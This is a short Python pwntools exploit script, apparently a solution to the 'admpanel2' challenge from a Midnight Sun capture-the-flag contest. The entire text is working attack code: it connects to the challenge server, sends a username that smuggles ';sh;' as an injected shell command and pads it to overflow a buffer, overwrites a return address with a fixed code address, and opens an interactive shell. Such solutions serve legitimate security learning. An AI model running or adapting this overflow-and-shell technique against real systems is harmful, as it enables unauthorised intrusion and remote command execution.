from pwn import *

p = process("./admpanel2",aslr=False)
p = remote("admpanel2-01.play.midnightsunctf.se",31337)

go = lambda x : p.sendlineafter(">",str(x))
go2 = lambda x : p.sendlineafter(":",str(x))

go(1)
go2("admin;sh;" + "B"*(0x100-14) + "\x00sh\x00")
go2("password")

pay  = p64(0x0000000000401598)

go(2)
go2(pay)

p.interactive()
